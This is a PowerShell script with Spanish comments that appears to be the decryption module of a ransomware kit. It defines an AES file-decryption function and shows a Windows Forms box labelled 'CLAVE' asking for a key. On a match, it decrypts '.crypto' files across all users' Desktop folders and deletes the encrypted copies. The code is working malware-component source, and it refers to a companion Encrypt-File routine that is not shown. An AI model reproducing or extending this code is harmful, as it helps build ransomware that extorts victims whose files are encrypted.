
## --------------------------------------------------------------------------##

## FUNCION DESENCRIPTACION DENTRO DE CAJ DONDE SE INTRODUCE LA CLAVE

## --------------------------------------------------------------------------##

Function Decrypt-File
{

    Param(
       [Parameter(Mandatory=$true, Position=1)]
       [System.IO.FileInfo[]]$FileToDecrypt,
       [Parameter(Mandatory=$true, Position=2)]
       [String]$Key,
       [Parameter(Mandatory=$false, Position=3)]
       [String]$Suffix = '.extension'
    )
 
    
    Try
    {
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
    }
    Catch
    {
        Write-Error 'Could not load required assembly.'
        Return
    }

    # AQUI SE USA LA CLAVE AES
    try
    {
        $EncryptionKey = [System.Convert]::FromBase64String($Key)
        $KeySize = $EncryptionKey.Length*8
        $AESProvider = New-Object 'System.Security.Cryptography.AesManaged'
        $AESProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AESProvider.BlockSize = 128
        $AESProvider.KeySize = $KeySize
        $AESProvider.Key = $EncryptionKey
    }
    Catch
    {
        Write-Error 'Unable to configure AES, verify you are using a valid key.'
        Return
    }

    Write-Verbose "Encryping $($FileToDecrypt.Count) File(s) with the $KeySize-bit key $Key"

    
    $DecryptedFiles = @()

    ForEach($File in $FileToDecrypt)
    {
        
        If(-not $File.Name.EndsWith($Suffix))
        {
            Write-Error "$($File.FullName) does not have an extension of '$Suffix'."
            Continue
        }

        
        Try
        {
            $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
        }
        Catch
        {
            Write-Error "Unable to open $($File.FullName) for reading."
            Continue
        }
    
       
        $DestinationFile = $File.FullName -replace "$Suffix$"
        Try
        {
            $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
        }
        Catch
        {
            Write-Error "Unable to open $DestinationFile for writing."
            $FileStreamReader.Close()
            Continue
        }

        
        try
        {
            [Byte[]]$LenIV = New-Object Byte[] 4
            $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileStreamReader.Read($LenIV,  0, 3) | Out-Null
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
            [Byte[]]$IV = New-Object Byte[] $LIV
            $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileStreamReader.Read($IV, 0, $LIV) | Out-Null
            $AESProvider.IV = $IV
        }
        catch
        {
            Write-Error 'Unable to read IV from file, verify this file was made using the included Encrypt-File function.'
            Continue
        }

        Write-Verbose "Decrypting $($File.FullName) with an IV of $([System.Convert]::ToBase64String($AESProvider.IV))"

         # DESENCRIPTACION DE LOS ARCHIVOS
        try
        {
            $Transform = $AESProvider.CreateDecryptor()
            [Int]$Count = 0
            [Int]$BlockSizeBytes = $AESProvider.BlockSize / 8
            [Byte[]]$Data = New-Object Byte[] $BlockSizeBytes
            $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
            Do
            {
                $Count = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
                $CryptoStream.Write($Data, 0, $Count)
            }
            While ($Count -gt 0)

            $CryptoStream.FlushFinalBlock()
            $CryptoStream.Close()
            $FileStreamWriter.Close()
            $FileStreamReader.Close()

            #Delete encrypted file
            Remove-Item $File.FullName
            Write-Verbose "Successfully decrypted $($File.FullName)"
            $DecryptedFiles += $DestinationFile
        }
        catch
        {
            Write-Error "Failed to decrypt $($File.FullName)."
            $CryptoStream.Close()
            $FileStreamWriter.Close()
            $FileStreamReader.Close()
            Remove-Item $DestinationFile
        }        
    }

    $Result = New-Object –TypeName PSObject
    $Result | Add-Member –MemberType NoteProperty –Name Computer –Value $env:COMPUTERNAME
    $Result | Add-Member –MemberType NoteProperty –Name Key –Value $Key
    $Result | Add-Member –MemberType NoteProperty –Name Files –Value $DecryptedFiles
    return $Result
}





## --------------------------------------------------------------------------##


## AQUI MOSTRAMOS UN MENSAJE CON UNA CAJA DE TEXTO 
## PARA INTRODUCIR LA CLAVE DE ENCRIPTACION

    param(
        ## 
        [string] $Title = "CLAVE"
    )

    Set-StrictMode -Version Latest

    Add-Type -Assembly System.Windows.Forms

    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size @(500,300)
    $form.FormBorderStyle = "FixedToolWindow"

    $textbox = New-Object Windows.Forms.TextBox
    $textbox.Top = 50
    $textbox.Left = 50
    $textBox.Width = 380
    $textbox.Anchor = "Left","Right"
    $form.Text = $Title

    $buttonPanel = New-Object Windows.Forms.Panel
    $buttonPanel.Size = New-Object Drawing.Size @(400,40)
    $buttonPanel.Dock = "Bottom"

    $cancelButton = New-Object Windows.Forms.Button
    $cancelButton.Text = "Cancel"
    $cancelButton.DialogResult = "Cancel"
    $cancelButton.Top = $buttonPanel.Height - $cancelButton.Height - 10
    $cancelButton.Left = $buttonPanel.Width - $cancelButton.Width - 10
    $cancelButton.Anchor = "Right"

    $okButton = New-Object Windows.Forms.Button
    $okButton.Text = "Ok"
    $okButton.DialogResult = "Ok"
    $okButton.Top = $cancelButton.Top
    $okButton.Left = $cancelButton.Left - $okButton.Width - 5
    $okButton.Anchor = "Right"


    $buttonPanel.Controls.Add($okButton)
    $buttonPanel.Controls.Add($cancelButton)


    $form.Controls.Add($buttonPanel)
    $form.Controls.Add($textbox)
    $form.AcceptButton = $okButton
    $form.CancelButton = $cancelButton
    $form.Add_Shown( { $form.Activate(); $textbox.Focus() } )

    $result = $form.ShowDialog()

    if($result -eq "OK")

    
    ## DESENCRIPTAMOS LOS ARCHIVOS CON LA EXTENSION .crypto

    {
    

        if ($textbox.Text -eq $key)
        {
            foreach($_ in Get-ChildItem C:\*\*\Desktop\* -ErrorAction SilentlyContinue)
            {Decrypt-File $_ -Key $key -Suffix '.crypto' -ErrorAction SilentlyContinue}
        }
    }


